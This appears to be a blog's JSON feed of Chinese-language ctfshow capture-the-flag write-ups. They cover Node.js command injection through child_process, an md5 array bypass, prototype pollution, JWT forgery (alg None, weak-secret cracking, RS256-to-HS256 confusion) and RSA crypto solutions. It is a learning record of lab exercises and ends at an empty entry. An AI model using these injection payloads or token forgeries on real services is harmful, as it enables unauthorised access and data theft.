{
    "version": "https://jsonfeed.org/version/1",
    "title": "dpm12345 • All posts by \"ctfshow\" category",
    "description": "学习记录",
    "home_page_url": "http://dpm12345.cn",
    "items": [
        {
            "id": "http://dpm12345.cn/posts/3418e521/",
            "url": "http://dpm12345.cn/posts/3418e521/",
            "title": "nodejs",
            "date_published": "2023-08-10T14:15:40.000Z",
            "content_html": "<h1 id=\"web-334\"><a href=\"#web-334\" class=\"headerlink\" title=\"web 334\"></a>web 334</h1><p>下载题目附件，得到两个js文件</p>\n<p>user.js</p>\n<pre><code class=\"javascript\">module.exports = {\n  items: [\n    {username: 'CTFSHOW', password: '123456'}\n  ]\n};\n</code></pre>\n<p>login.js</p>\n<pre><code class=\"javascript\">var express = require('express');\nvar router = express.Router();\nvar users = require('../modules/user').items;\n \nvar findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;\n  });\n};\n\n/* GET home page. */\nrouter.post('/', function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var sess = req.session;\n  var user = findUser(req.body.username, req.body.password);\n \n  if(user){\n    req.session.regenerate(function(err) {\n      if(err){\n        return res.json({ret_code: 2, ret_msg: '登录失败'});        \n      }\n       \n      req.session.loginUser = user.username;\n      res.json({ret_code: 0, ret_msg: '登录成功',ret_flag:flag});              \n    });\n  }else{\n    res.json({ret_code: 1, ret_msg: '账号或密码错误'});\n  }  \n  \n});\n\nmodule.exports = router;\n</code></pre>\n<p>从代码中可以看到，当登录成功时，会返回flag</p>\n<p>而判断是否登录正确的代码如下</p>\n<pre><code class=\"javascript\">var findUser = function(name, password){\n  return users.find(function(item){\n    return name!=='CTFSHOW' &amp;&amp; item.username === name.toUpperCase() &amp;&amp; item.password === password;\n  });\n};\n</code></pre>\n<p>从<code>return</code>中，可以看到，要使得输入用户名不为<code>CTFSHOW</code>,但其全部大写等于原设置的用户名(即<code>CTFSHOW</code>),最后密码相等</p>\n<p>由user.js,可以知道用户名和密码分别为<code>CTFSHOW</code>和<code>123456</code>,而为了满足条件，可以将用户名其中一个字母变为小写输入提交</p>\n<p>如下所示</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_1.png\" alt=\"image-20230810195751429\"></p>\n<h1 id=\"web-335\"><a href=\"#web-335\" class=\"headerlink\" title=\"web 335\"></a>web 335</h1><pre><code>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。\n在eval函数的参数中可以构造require('child_process').exec('');来进行调用。\n</code></pre>\n<p>使用<code>exec</code>返回<code>[object Object]</code></p>\n<p>可替换用法 <code>execSync</code> <code>spawnSync</code></p>\n<ol>\n<li><p>使用<code>execSync</code></p>\n<pre><code class=\"javascript\">require('child_process').execSync('ls')\nrequire('child_process').execSync('cat fl00g.txt')\n</code></pre>\n</li>\n<li><p>使用<code>spawnSync</code></p>\n<pre><code class=\"javascript\">require('child_process').spawnSync('ls').stdout.toString()\nrequire('child_process').spawnSync('cat',['fl00g.txt']).stdout.toString()\n</code></pre>\n</li>\n</ol>\n<h1 id=\"web-336\"><a href=\"#web-336\" class=\"headerlink\" title=\"web 336\"></a>web 336</h1><pre><code class=\"javascript\">require('child_process').spawnSync('ls').stdout.toString()\nrequire('child_process').spawnSync('cat',['fl001g.txt']).stdout.toString()\n</code></pre>\n<h1 id=\"web-337\"><a href=\"#web-337\" class=\"headerlink\" title=\"web 337\"></a>web 337</h1><pre><code class=\"javascript\">var express = require('express');\nvar router = express.Router();\nvar crypto = require('crypto');\n\nfunction md5(s) {\n  return crypto.createHash('md5')\n    .update(s)\n    .digest('hex');\n}\n\n/* GET home page. */\nrouter.get('/', function(req, res, next) {\n  res.type('html');\n  var flag='xxxxxxx';\n  var a = req.query.a;\n  var b = req.query.b;\n  if(a &amp;&amp; b &amp;&amp; a.length===b.length &amp;&amp; a!==b &amp;&amp; md5(a+flag)===md5(b+flag)){\n      res.end(flag);\n  }else{\n      res.render('index',{ msg: 'tql'});\n  }\n  \n});\n\nmodule.exports = router;\n</code></pre>\n<p>md5数组绕过</p>\n<pre><code>?a[]=1&amp;b[]=1\n</code></pre>\n<h1 id=\"web-338\"><a href=\"#web-338\" class=\"headerlink\" title=\"web 338\"></a>web 338</h1><p>题目给出了源码</p>\n<p>查阅wp，知该题为nodejs原型污染</p>\n<h2 id=\"原型链污染\"><a href=\"#原型链污染\" class=\"headerlink\" title=\"原型链污染\"></a>原型链污染</h2><p>Javascript里每个类都有一个<code>prototype</code>的属性，用来绑定所有对象都会有变量与函数，对象的构造函数又指向类本身，同时对象的<code>__proto__</code>属性也指向类的<code>prototype</code>。因此，有以下关系：</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_2.png\" alt=\"web334_2\"></p>\n<p>并且，类的继承是通过原型链传递的，一个类的<code>prototype</code>属性指向其继承的类的一个对象。所以一个类的<code>prototype.__proto__</code>等于其父类的<code>prototype</code>，当然也等于该类对象的<code>__proto__.__proto__</code>属性。</p>\n<p>我们获取某个对象的某个成员时，如果找不到，就会通过原型链一步步往上找，直到某个父类的原型为<code>null</code>为止。所以修改对象的某个父类的<code>prototype</code>的原型就可以通过原型链影响到跟此类有关的所有对象。</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web334_3.png\" alt=\"web334_3\"></p>\n<p>而在源码中可以发现</p>\n<p>login.js</p>\n<pre><code class=\"javascript\">/* GET home page.  */\nrouter.post('/', require('body-parser').json(),function(req, res, next) {\n  res.type('html');\n  var flag='flag_here';\n  var secert = {};\n  var sess = req.session;\n  let user = {};\n  utils.copy(user,req.body);\n  if(secert.ctfshow==='36dboy'){\n    res.end(flag);\n  }else{\n    return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)});  \n  }\n  \n  \n});\n</code></pre>\n<p>copy在common.js中</p>\n<pre><code class=\"javascript\">module.exports = {\n  copy:copy\n};\n\nfunction copy(object1, object2){\n    for (let key in object2) {\n        if (key in object2 &amp;&amp; key in object1) {\n            copy(object1[key], object2[key])\n        } else {\n            object1[key] = object2[key]\n        }\n    }\n  }\n</code></pre>\n<p>由此，在上传登录的用户名密码信息时，copy对其属性即值进行了复制，那么就可以通过抓包在<code>__proto__</code>增添<code>ctfshow</code>这一项的值，为<code>36dboy</code></p>\n<p>抓包并修改提交的数据data如下(即添加<code>__proto_</code>项)</p>\n<p><img data-src=\"/./../../../../post_images/ctfshow/Web-vip/web_338_1.png\" alt=\"image-20230815011437707\"></p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/8d17cdf0/",
            "url": "http://dpm12345.cn/posts/8d17cdf0/",
            "title": "jwt",
            "date_published": "2023-05-31T17:12:40.000Z",
            "content_html": "<h1 id=\"JWT-简介\"><a href=\"#JWT-简介\" class=\"headerlink\" title=\"JWT 简介\"></a>JWT 简介</h1><h1 id=\"web-345\"><a href=\"#web-345\" class=\"headerlink\" title=\"web 345\"></a>web 345</h1><p>在cookie里找到auth，然后将其放到jwt.io解码，可以得到一堆信息，可以发现签名算法为None，因此不需签名认证</p>\n<p>根据原题目源代码的提示admin，试着将<code>sub:'user'</code>改为admin用户，将新生成的cookie复制到cookie里，然后访问<code>/admin</code>得到flag</p>\n<h1 id=\"web-346\"><a href=\"#web-346\" class=\"headerlink\" title=\"web 346\"></a>web 346</h1><p>相比于签名的，有签名算法了，但可以按上面一题一样，将算法改为None，然后山区签名结果，这样可以访问到flag</p>\n<h1 id=\"web-347\"><a href=\"#web-347\" class=\"headerlink\" title=\"web 347\"></a>web 347</h1><p>根据题目的弱口令，可以爆破或者弱口令尝试分别使用</p>\n<p>计算爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2JyZW5kYW4tcml1cy9jLWp3dC1jcmFja2Vy\">c-jwt-cracker</span><del>自己试跑了好久也没成</del></p>\n<p>字典爆破<span class=\"exturl\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL2hhaHd1bC9qd3QtaGFjaw==\">jwt-hack</span></p>\n<p>跑出来密码是<code>123456</code>，然后到<span class=\"exturl\" data-url=\"aHR0cHM6Ly9qd3QuaW8v\">jwt.io</span>encode生成cookie即可</p>\n<p>然后复制修改cookie值，访问<code>/admin/</code></p>\n<h1 id=\"web-348\"><a href=\"#web-348\" class=\"headerlink\" title=\"web 348\"></a>web 348</h1><p>同上一题，得到密码为<code>aaab</code></p>\n<h1 id=\"web-349\"><a href=\"#web-349\" class=\"headerlink\" title=\"web 349\"></a>web 349</h1><p>根据给的<code>app.js</code>，分别访问<code>/public.key</code>和<code>/private.key</code>获得公私钥文件</p>\n<p>然后放到jwt.io网站上生成cookie(原题目给的私钥大小不是2048位的，不能生成)</p>\n<p>这里采用的是<span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cuYmlsaWJpbGkuY29tL3ZpZGVvL0JWMXZVNHkxODdIRS8=\">ctfshow jwt视频</span>的自建环境生成cookie</p>\n<p>要注意的是，新版本的jsonwebtoken(9.0.0)可能会报错</p>\n<p><code>secretOrPrivateKey has a minimum key size of 2048 bits for RS256</code></p>\n<p>查询相关资料后，可以下载8.5.1版本的jsonwebtoken，<code>npm install jsonwebtoken@8.5.1 --save</code>,然后生成后复制cookie替换，最后post访问网站</p>\n<h1 id=\"web-350\"><a href=\"#web-350\" class=\"headerlink\" title=\"web 350\"></a>web 350</h1><p>相比于上题，只能获得公钥，但可以通过<code>RS256 -&gt; HS256</code>是验证算法改变</p>\n<pre><code>HS256算法使用密钥为所有消息进行签名和验证。\n\n而RS256算法则使用私钥对消息进行签名并使用公钥进行身份验证。\n\n如果将算法从RS256改为HS256，则后端代码将使用公钥作为密钥，然后使用HS256算法验证签名。\n\n由于攻击者有时可以获取公钥，因此，攻击者可以将头部中的算法修改为HS256，然后使用RSA公钥对数据进行签名。\n\n这样的话，后端代码使用RSA公钥+HS256算法进行签名验证\n</code></pre>\n<p>按照上题的构造方法生成cookie即可</p>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/1f01c3ee/",
            "url": "http://dpm12345.cn/posts/1f01c3ee/",
            "title": "BJDCTF2020",
            "date_published": "2023-04-08T12:12:40.000Z",
            "content_html": "<h1 id=\"Crypto\"><a href=\"#Crypto\" class=\"headerlink\" title=\"Crypto\"></a>Crypto</h1><h2 id=\"easyrsa\"><a href=\"#easyrsa\" class=\"headerlink\" title=\"easyrsa\"></a>easyrsa</h2><pre><code class=\"python\">from Crypto.Util.number import getPrime,bytes_to_long\nfrom sympy import Derivative\nfrom fractions import Fraction\nfrom secret import flag\n\np=getPrime(1024)\nq=getPrime(1024)\ne=65537                                                                                                                                                     \nn=p*q\nz=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arth(q),q))\nm=bytes_to_long(flag)\nc=pow(m,e,n)\nprint(c,z,n)\n'''\noutput:\n7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035\n32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482\n15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441\n\n'''\n</code></pre>\n<p>根据源代码，已知c,z,m</p>\n<p>而<code>z=Fraction(1,Derivative(arctan(p),p))-Fraction(1,Derivative(arctan(q),q))</code></p>\n<p>查阅资料，<code>Derivative</code>为求导操作，<code>arctan</code>和<code>arctan</code>的导数分别为$\\frac{1}{1+x^2}$,$\\frac{1}{1-x^2}$，而Fraction给出分数，故$z=p^2+q^2$</p>\n<p>因此，可以通过以下式子求解<br>$$<br>(p+q)^2 = z + 2n\\<br>故可以求得\\ p+q = \\sqrt{z+2n}\\</p>\n<p>构造\\ x^2 - (p+q)x + pq = 0，其解为\\ p和\\ q\\<br>p = \\frac{p+q+\\sqrt{(p+q)^2-4pq}}{2}\\<br>q =  \\frac{p+q-\\sqrt{(p+q)^2-4pq}}{2}(或者可以q=p+q-p)\\<br>故\\phi(n)=(p-1)*(q-1)\\<br>可以求得d，最后m=c^d\\ (mod \\ n)<br>$$</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\n\nc = 7922547866857761459807491502654216283012776177789511549350672958101810281348402284098310147796549430689253803510994877420135537268549410652654479620858691324110367182025648788407041599943091386227543182157746202947099572389676084392706406084307657000104665696654409155006313203957292885743791715198781974205578654792123191584957665293208390453748369182333152809882312453359706147808198922916762773721726681588977103877454119043744889164529383188077499194932909643918696646876907327364751380953182517883134591810800848971719184808713694342985458103006676013451912221080252735948993692674899399826084848622145815461035\nz = 32115748677623209667471622872185275070257924766015020072805267359839059393284316595882933372289732127274076434587519333300142473010344694803885168557548801202495933226215437763329280242113556524498457559562872900811602056944423967403777623306961880757613246328729616643032628964072931272085866928045973799374711846825157781056965164178505232524245809179235607571567174228822561697888645968559343608375331988097157145264357626738141646556353500994924115875748198318036296898604097000938272195903056733565880150540275369239637793975923329598716003350308259321436752579291000355560431542229699759955141152914708362494482\nn = 15310745161336895413406690009324766200789179248896951942047235448901612351128459309145825547569298479821101249094161867207686537607047447968708758990950136380924747359052570549594098569970632854351825950729752563502284849263730127586382522703959893392329333760927637353052250274195821469023401443841395096410231843592101426591882573405934188675124326997277775238287928403743324297705151732524641213516306585297722190780088180705070359469719869343939106529204798285957516860774384001892777525916167743272419958572055332232056095979448155082465977781482598371994798871917514767508394730447974770329967681767625495394441\n\ne = 65537\n\np_and_q,_ = gmpy2.iroot(z+2*n,2)\np = (p_and_q + gmpy2.iroot(pow(p_and_q,2)-4*n,2)[0])//2\nq = p_and_q - p\nprint(p,q)\n\nphi = (p-1)*(q-1)\n\nd = gmpy2.invert(e,phi)\nm = pow(c,d,n)\n\nprint(long_to_bytes(m))\n# BJD{Advanced_mathematics_is_too_hard!!!}\n</code></pre>\n<h2 id=\"rsaoutput\"><a href=\"#rsaoutput\" class=\"headerlink\" title=\"rsaoutput\"></a>rsaoutput</h2><p>注意到输出信息，很容易得到n相同，e不同，为共模攻击</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\nn1 = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111\ne1 = 2767\n\nn2 = 21058339337354287847534107544613605305015441090508924094198816691219103399526800112802416383088995253908857460266726925615826895303377801614829364034624475195859997943146305588315939130777450485196290766249612340054354622516207681542973756257677388091926549655162490873849955783768663029138647079874278240867932127196686258800146911620730706734103611833179733264096475286491988063990431085380499075005629807702406676707841324660971173253100956362528346684752959937473852630145893796056675793646430793578265418255919376323796044588559726703858429311784705245069845938316802681575653653770883615525735690306674635167111\ne2 = 3659\n\nmessage1=20152490165522401747723193966902181151098731763998057421967155300933719378216342043730801302534978403741086887969040721959533190058342762057359432663717825826365444996915469039056428416166173920958243044831404924113442512617599426876141184212121677500371236937127571802891321706587610393639446868836987170301813018218408886968263882123084155607494076330256934285171370758586535415136162861138898728910585138378884530819857478609791126971308624318454905992919405355751492789110009313138417265126117273710813843923143381276204802515910527468883224274829962479636527422350190210717694762908096944600267033351813929448599\n\nmessage2=11298697323140988812057735324285908480504721454145796535014418738959035245600679947297874517818928181509081545027056523790022598233918011261011973196386395689371526774785582326121959186195586069851592467637819366624044133661016373360885158956955263645614345881350494012328275215821306955212788282617812686548883151066866149060363482958708364726982908798340182288702101023393839781427386537230459436512613047311585875068008210818996941460156589314135010438362447522428206884944952639826677247819066812706835773107059567082822312300721049827013660418610265189288840247186598145741724084351633508492707755206886202876227\n\n_,s,t = gmpy2.gcdext(e1,e2)\nm = gmpy2.powmod(message1,int(s),n1)*gmpy2.powmod(message2,int(t),n1) % n1\n\nprint(long_to_bytes(int(m)))\n# BJD{r3a_C0mmoN_moD@_4ttack}\n</code></pre>\n<h2 id=\"RSA\"><a href=\"#RSA\" class=\"headerlink\" title=\"RSA\"></a>RSA</h2><pre><code class=\"python\">from Crypto.Util.number import getPrime,bytes_to_long\n\nflag=open(\"flag\",\"rb\").read()\n\np=getPrime(1024)\nq=getPrime(1024)\nassert(e&lt;100000)\nn=p*q\nm=bytes_to_long(flag)\nc=pow(m,e,n)\nprint c,n\nprint pow(294,e,n)\n\np=getPrime(1024)\nn=p*q\nm=bytes_to_long(\"BJD\"*32)\nc=pow(m,e,n)\nprint c,n\n\n'''\noutput:\n12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120  13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037\n381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018\nn'''\n</code></pre>\n<p>根据两个n的生成方法，可以通过求两数的最大公因数，求得q，然后依次求得p1,phi，再根据e的范围，可以爆破出e，之后求得d，最后求得m</p>\n<pre><code class=\"python\">from Crypto.Util.number import long_to_bytes\nimport gmpy2\nc1 = 12641635617803746150332232646354596292707861480200207537199141183624438303757120570096741248020236666965755798009656547738616399025300123043766255518596149348930444599820675230046423373053051631932557230849083426859490183732303751744004874183062594856870318614289991675980063548316499486908923209627563871554875612702079100567018698992935818206109087568166097392314105717555482926141030505639571708876213167112187962584484065321545727594135175369233925922507794999607323536976824183162923385005669930403448853465141405846835919842908469787547341752365471892495204307644586161393228776042015534147913888338316244169120\nn1 = 13508774104460209743306714034546704137247627344981133461801953479736017021401725818808462898375994767375627749494839671944543822403059978073813122441407612530658168942987820256786583006947001711749230193542370570950705530167921702835627122401475251039000775017381633900222474727396823708695063136246115652622259769634591309421761269548260984426148824641285010730983215377509255011298737827621611158032976420011662547854515610597955628898073569684158225678333474543920326532893446849808112837476684390030976472053905069855522297850688026960701186543428139843783907624317274796926248829543413464754127208843070331063037\npow_num = 381631268825806469518166370387352035475775677163615730759454343913563615970881967332407709901235637718936184198930226303761876517101208677107311006065728014220477966000620964056616058676999878976943319063836649085085377577273214792371548775204594097887078898598463892440141577974544939268247818937936607013100808169758675042264568547764031628431414727922168580998494695800403043312406643527637667466318473669542326169218665366423043579003388486634167642663495896607282155808331902351188500197960905672207046579647052764579411814305689137519860880916467272056778641442758940135016400808740387144508156358067955215018\nc2 = 979153370552535153498477459720877329811204688208387543826122582132404214848454954722487086658061408795223805022202997613522014736983452121073860054851302343517756732701026667062765906277626879215457936330799698812755973057557620930172778859116538571207100424990838508255127616637334499680058645411786925302368790414768248611809358160197554369255458675450109457987698749584630551177577492043403656419968285163536823819817573531356497236154342689914525321673807925458651854768512396355389740863270148775362744448115581639629326362342160548500035000156097215446881251055505465713854173913142040976382500435185442521721\nn2 = 12806210903061368369054309575159360374022344774547459345216907128193957592938071815865954073287532545947370671838372144806539753829484356064919357285623305209600680570975224639214396805124350862772159272362778768036844634760917612708721787320159318432456050806227784435091161119982613987303255995543165395426658059462110056431392517548717447898084915167661172362984251201688639469652283452307712821398857016487590794996544468826705600332208535201443322267298747117528882985955375246424812616478327182399461709978893464093245135530135430007842223389360212803439850867615121148050034887767584693608776323252233254261047\n\nq = gmpy2.gcd(n1, n2)\np1 = n1 // q\np2 = n2 // q\nphi1 = (p1-1)*(q-1)\nphi2 = (p2-1)*(q-1)\nfor i in range(100000):\n    if pow(294,i,n1) == pow_num:\n        e = i\n        break\nd1 = gmpy2.invert(e,phi1)\n\nm = pow(c1,d1,n1)\n\nprint(long_to_bytes(m))\n# BJD{p_is_common_divisor}\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/68282885/",
            "url": "http://dpm12345.cn/posts/68282885/",
            "title": "crypto",
            "date_published": "2023-04-08T12:12:40.000Z",
            "content_html": "<h2 id=\"crypto-1\"><a href=\"#crypto-1\" class=\"headerlink\" title=\"crypto 1\"></a>crypto 1</h2><h2 id=\"crypto-2\"><a href=\"#crypto-2\" class=\"headerlink\" title=\"crypto 2\"></a>crypto 2</h2><p>js,放在浏览器控制台</p>\n<h2 id=\"crypto-3\"><a href=\"#crypto-3\" class=\"headerlink\" title=\"crypto 3\"></a>crypto 3</h2><p>js颜文字加密，浏览器打开乱码，尝试下载打开(复制链接下载)，然后放入控制台</p>\n<h2 id=\"crypto-4\"><a href=\"#crypto-4\" class=\"headerlink\" title=\"crypto 4\"></a>crypto 4</h2><p>RSA密码求d</p>\n<h2 id=\"crypto-5\"><a href=\"#crypto-5\" class=\"headerlink\" title=\"crypto 5\"></a>crypto 5</h2><p>RSA密码求m</p>\n<h2 id=\"crypto-6\"><a href=\"#crypto-6\" class=\"headerlink\" title=\"crypto 6\"></a>crypto 6</h2><p>rabbit加密</p>\n<pre><code class=\"raw\">U2FsdGVkX19mGsGlfI3nciNVpWZZRqZO2PYjJ1ZQuRqoiknyHSWeQv8ol0uRZP94MqeD2xz+\n</code></pre>\n<h2 id=\"crypto-7\"><a href=\"#crypto-7\" class=\"headerlink\" title=\"crypto 7\"></a>crypto 7</h2><p>ook解密</p>\n<h2 id=\"crypto-8\"><a href=\"#crypto-8\" class=\"headerlink\" title=\"crypto 8\"></a>crypto 8</h2><p>brainfuck解密</p>\n<h2 id=\"crypto-9\"><a href=\"#crypto-9\" class=\"headerlink\" title=\"crypto 9\"></a>crypto 9</h2><p>暴力破解加密压缩包，为<code>4132</code></p>\n<p>解压后，得到文件，然后利用压缩包名字的加密方式解密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3NlcnBlbnQub25saW5lLWRvbWFpbi10b29scy5jb20v\">http://serpent.online-domain-tools.com/</span></p>\n<h2 id=\"crypto-10\"><a href=\"#crypto-10\" class=\"headerlink\" title=\"crypto 10\"></a>crypto 10</h2><p>一连等于，Quoted-printable编码</p>\n<h1 id=\"crypto-11\"><a href=\"#crypto-11\" class=\"headerlink\" title=\"crypto 11\"></a>crypto 11</h1><p>MD5解密</p>\n<h2 id=\"crypto-0\"><a href=\"#crypto-0\" class=\"headerlink\" title=\"crypto 0\"></a>crypto 0</h2><p>凯撒密码</p>\n<h2 id=\"crypto-12\"><a href=\"#crypto-12\" class=\"headerlink\" title=\"crypto 12\"></a>crypto 12</h2><p>Atbash cipher(埃特巴什码)加密</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3d3dy5wcmFjdGljYWxjcnlwdG9ncmFwaHkuY29tL2NpcGhlcnMvY2xhc3NpY2FsLWVyYS9hdGJhc2gtY2lwaGVyLw==\">http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/</span></p>\n<h2 id=\"crypto-13\"><a href=\"#crypto-13\" class=\"headerlink\" title=\"crypto 13\"></a>crypto 13</h2><p>base家族解密</p>\n<pre><code class=\"python\">'''\nAuthor       : zhong\nsince        : 2022-08-28 12:30:32\nLastAuthor   : zhong\nlastTime     : 2022-08-28 13:36:13\nblog         : http://dpm12345.cn/\nemail        : 1006975692@qq.com\n'''\nimport base64\nimport hashlib\nmw = ''\nwith open(\"./base.txt\", 'r', encoding='utf-8') as f:\n    mw = f.read()\n\nwhile True:\n    try:\n        res = base64.b16decode(mw)\n        mw = res.decode('utf-8')\n        print(1)\n        if \"flag\" in mw:\n            break\n    except:\n        pass\n    try:\n        res = base64.b32decode(mw)\n        mw = res.decode('utf-8')\n        print(2)\n        if \"flag\" in mw:\n            break\n    except:\n        pass\n    try:\n        res = base64.b64decode(mw)\n        mw = res.decode('utf-8')\n        print(3)\n        if \"flag\" in mw:\n            break\n\n    except:\n        pass\nprint(mw)\n</code></pre>\n<h2 id=\"crypto-14\"><a href=\"#crypto-14\" class=\"headerlink\" title=\"crypto 14\"></a>crypto 14</h2><p>得到数字以空格为分隔符转为十六进制再转为字母</p>\n<p>得到<code>3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG</code></p>\n<p>“flag”使用base64<span class=\"exturl\" data-url=\"aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT0lRTUlOEElQTAlRTUlQUYlODYmc3BtPTEwMDEuMjEwMS4zMDAxLjcwMjA=\">加密</span>后的字符串是 ZmxhZw== 前面的ZmxhZ不管flag后面是什么都不会改变。我们对比一下前四个字符，”Zmxh”和”3EP/“在base64表中查一下，Z和3差了30，m和E差了30。</p>\n<p>解密脚本</p>\n<pre><code class=\"python\">s= '3EP/3VNFFmNEAnlHD5dCMmVHD5ad9uG'\nt = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'\nl=\"\"\nfor i in s:\n    l += t[(t.index(i)-30)%64]\n\nif len(l)%4!=0:\n    l=l+\"=\"*(4-(len(l)%4))\nprint(l)\n</code></pre>\n<h2 id=\"easyrsa2\"><a href=\"#easyrsa2\" class=\"headerlink\" title=\"easyrsa2\"></a>easyrsa2</h2><pre><code class=\"python\">import gmpy2\nfrom Crypto.Util.number import long_to_bytes\ne = 65537\nn1 = 23686563925537577753047229040754282953352221724154495390687358877775380147605152455537988563490716943872517593212858326146811511103311865753018329109314623702207073882884251372553225986112006827111351501044972239272200616871716325265416115038890805114829315111950319183189591283821793237999044427887934536835813526748759612963103377803089900662509399569819785571492828112437312659229879806168758843603248823629821851053775458651933952183988482163950039248487270453888288427540305542824179951734412044985364866532124803746008139763081886781361488304666575456680411806505094963425401175510416864929601220556158569443747\nc1 = 1627484142237897613944607828268981193911417408064824540711945192035649088104133038147400224070588410335190662682231189997580084680424209495303078061205122848904648319219646588720994019249279863462981015329483724747823991513714172478886306703290044871781158393304147301058706003793357846922086994952763485999282741595204008663847963539422096343391464527068599046946279309037212859931303335507455146001390326550668531665493245293839009832468668390820282664984066399051403227990068032226382222173478078505888238749583237980643698405005689247922901342204142833875409505180847943212126302482358445768662608278731750064815\n\ne = 65537\nn2 = 22257605320525584078180889073523223973924192984353847137164605186956629675938929585386392327672065524338176402496414014083816446508860530887742583338880317478862512306633061601510404960095143941320847160562050524072860211772522478494742213643890027443992183362678970426046765630946644339093149139143388752794932806956589884503569175226850419271095336798456238899009883100793515744579945854481430194879360765346236418019384644095257242811629393164402498261066077339304875212250897918420427814000142751282805980632089867108525335488018940091698609890995252413007073725850396076272027183422297684667565712022199054289711\nc2 = 2742600695441836559469553702831098375948641915409106976157840377978123912007398753623461112659796209918866985480471911393362797753624479537646802510420415039461832118018849030580675249817576926858363541683135777239322002741820145944286109172066259843766755795255913189902403644721138554935991439893850589677849639263080528599197595705927535430942463184891689410078059090474682694886420022230657661157993875931600932763824618773420077273617106297660195179922018875399174346863404710420166497017196424586116535915712965147141775026549870636328195690774259990189286665844641289108474834973710730426105047318959307995062\n\n\np = gmpy2.gcd(n1,n2)\nq1 = n1//p\nd = gmpy2.invert(e,(p-1)*(q1-1))\nprint(long_to_bytes(pow(c1,d,n1)))\n</code></pre>\n",
            "tags": [
                "CTF",
                "ctfshow"
            ]
        },
        {
            "id": "http://dpm12345.cn/posts/47d18edd/",
            "url": "http://dpm12345.cn/posts/47d18edd/",
            "title": "SSTI",
            "date_published": "2023-03-31T03:12:40.000Z",
